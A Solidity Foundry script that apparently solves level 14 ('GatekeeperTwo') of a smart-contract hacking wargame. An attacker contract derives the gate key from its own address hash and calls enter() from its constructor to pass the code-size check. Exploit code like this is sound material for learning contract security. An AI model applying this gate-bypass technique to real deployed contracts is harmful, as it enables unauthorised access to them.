// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import{Script,console} from "forge-std/Script.sol";
import{GatekeeperTwo} from "../src/Level14.sol";


contract Attacker{
    constructor(GatekeeperTwo instance){
        //This contract will be the msg.sender of the enter fucntion in GateKeeperTwo contract
        bytes8 gateKey= bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        (bool success,)=address(instance).call(abi.encodeWithSignature("enter(bytes8)", gateKey));
    }
    
    }
contract Level14Solution is Script{
    GatekeeperTwo instance=GatekeeperTwo(0xf87094e724519Be5401Bfd665307c95fA3D70E1c);
    function run() external{
            console.log("entrant before hack",instance.entrant());
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            new Attacker(instance);
            console.log("entrant before hack",instance.entrant());
            vm.stopBroadcast(); 
    }
}